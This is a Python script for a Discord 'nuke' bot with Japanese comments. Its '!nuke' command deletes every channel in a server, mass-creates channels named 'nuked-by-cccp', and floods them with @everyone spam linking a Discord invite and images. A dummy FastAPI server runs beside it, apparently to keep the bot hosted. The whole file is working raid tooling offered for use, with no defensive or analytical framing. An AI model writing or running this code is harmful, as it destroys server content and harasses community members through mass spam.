import discord
from discord.ext import commands
import asyncio
import os
from fastapi import FastAPI
import uvicorn
import threading

# Discord Bot部分
TOKEN = os.getenv("DISCORD_TOKEN")
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

宣伝文 = (
    "@everyone @here\n"
    "# CCCP ON TOP\n"
    "# [参加](https://discord.gg/ncUCZfJXRs)\n"
    "# [画像](https://imgur.com/NbBGFcf)\n"
    "# [画像](https://imgur.com/pY7EpwN)"
)

@bot.event
async def on_ready():
    print(f"✅ Bot ログイン成功: {bot.user}")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    await ctx.message.delete()

    delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    new_channels = []
    for _ in range(4):
        tasks = [asyncio.create_task(guild.create_text_channel("nuked-by-cccp")) for _ in range(15)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        new_channels.extend([r for r in results if isinstance(r, discord.TextChannel)])
        await asyncio.sleep(1)

    async def spam(ch):
        for _ in range(50):
            try:
                await ch.send(宣伝文)
                await asyncio.sleep(0.5)
            except:
                await asyncio.sleep(2)

    await asyncio.gather(*(spam(ch) for ch in new_channels))

# ダミーのFastAPI Webサーバー
app = FastAPI()

@app.get("/")
def read_root():
    return {"status": "Bot is running"}

def run_web():
    uvicorn.run(app, host="0.0.0.0", port=8000)

# メイン処理
if __name__ == "__main__":
    # Webサーバーを別スレッドで起動
    threading.Thread(target=run_web).start()
    # Discord Bot起動
    bot.run(TOKEN)
